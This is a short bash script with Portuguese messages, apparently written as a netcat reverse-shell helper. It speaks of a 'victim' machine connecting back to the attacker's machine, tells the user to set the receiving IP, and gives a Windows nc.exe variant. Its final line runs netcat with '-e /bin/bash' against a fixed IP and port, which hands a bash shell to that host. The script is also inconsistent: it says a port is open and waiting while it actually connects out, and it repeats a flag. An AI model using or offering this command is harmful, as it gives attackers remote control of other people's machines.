#!/bin/bash
echo "Vamos abrir uma porta em nossa maquina e fazer com que a maquina da vitima se conecte a nossa maquina sem precisar abrir porta na vitima"
sleep 5
echo "Lembre-se de editar esse script e digitar o ip que vai receber a conexão!"
sleep 3
echo "Para abrir em Windows o comando é nc.exe -vn (ip do atacando) 5050"
sleep 5
echo "Porta aberta em nossa maquina esperando...."
sudo nc -vn  -vn 192.168.0.105 5050 -e /bin/bash

